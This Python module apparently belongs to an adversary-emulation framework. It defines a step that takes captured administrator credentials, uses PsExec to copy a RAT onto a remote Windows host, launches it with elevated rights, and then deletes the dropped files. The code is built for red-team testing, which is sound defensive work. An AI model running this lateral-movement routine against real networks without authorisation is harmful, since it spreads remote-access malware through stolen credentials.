import plugins.adversary.app.config as config
from plugins.adversary.app.commands import psexec
from plugins.adversary.app.operation.operation import Step, OPUser, OPDomain, OPFile, OPCredential, OPHost, OPRat, OPVar


class PsexecMove(Step):
    """
    Description:
        This step utilizes the Windows Internals tool PsExec to spawn a RAT on a remote host, moving through
        the network via lateral movement.
    Requirements:
        Requires credentials for an administrator on the target machine (needs both administrator enumeration
        'GetAdmin', and credential data 'Credentials'), and an enumerated domain. In addition, PsExec must have
        been downloaded and integrated into Caldera in order for this step to execute correctly.
        PsExec can be acquired and integrated using the 'Load PsExec' option in Settings.
    """
    attack_mapping = [('T1035', 'Execution')]
    display_name = "psexec_move"
    summary = "Move laterally using psexec"

    preconditions = [("rat", OPRat),
                     ("dest_host", OPHost),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    not_equal = [('dest_host', 'rat.host')]

    preproperties = ['domain.windows_domain', 'user.username', 'cred.password', 'dest_host.hostname']

    # file_g properties are intentionally omitted here to prevent the planner from thinking it is useful
    postconditions = [("file_g", OPFile),
                      ("rat_g", OPRat({"host": OPVar("dest_host"),
                                       "elevated": True}))]

    deterministic = True

    @staticmethod
    def description(rat, dest_host, cred, user, domain):
        return "Moving laterally to {} with {} via {} using psexec".format(dest_host.hostname, user.username,
                                                                           rat.host.hostname)

    @staticmethod
    async def action(operation, rat, dest_host, cred, user, domain, file_g, rat_g):
        ps_loc = "C:\\Users\\" + user.username + "\\" + operation.adversary_artifactlist.get_executable_word()
        rat_loc = "C:\\Users\\" + user.username + "\\" + operation.adversary_artifactlist.get_executable_word()
        # protect against potential duplicate naming
        if rat_loc == ps_loc:
            ps_loc = "C:\\Users\\" + user.username + "\\mystery.exe"
        await operation.drop_file(rat, ps_loc, config.settings.filestore_path + '/ps.hex')
        await operation.drop_file(rat, rat_loc, config.settings.exe_rat_path)
        await file_g({'path': ps_loc, 'host': rat.host, 'use_case': 'dropped'})
        await file_g({'path': rat_loc, 'host': rat.host, 'use_case': 'dropped'})
        await operation.execute_shell_command(rat, *psexec.copy(ps_loc, rat_loc, domain.windows_domain, user.username,
                                                                cred.password, dest_host.hostname, elevated=True))
        await rat_g()
        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for file in file_g:
            await cleaner.delete(file)
